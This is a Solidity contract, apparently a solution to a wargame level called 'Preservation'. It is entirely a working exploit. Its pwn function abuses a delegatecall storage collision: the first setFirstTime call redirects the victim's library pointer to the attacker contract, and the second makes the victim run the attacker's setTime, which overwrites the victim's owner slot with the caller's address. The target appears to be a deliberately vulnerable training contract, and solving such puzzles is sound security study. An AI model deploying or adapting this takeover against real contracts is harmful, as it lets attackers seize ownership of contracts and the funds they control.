// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'contracts/preservation.sol';

 contract AttackPreservation {

    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    
    function pwn(Preservation preservation) public{
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(msg.sender)));

    }

    function setTime(uint _owner) external {
        owner = address(uint160(_owner));
    }

 }  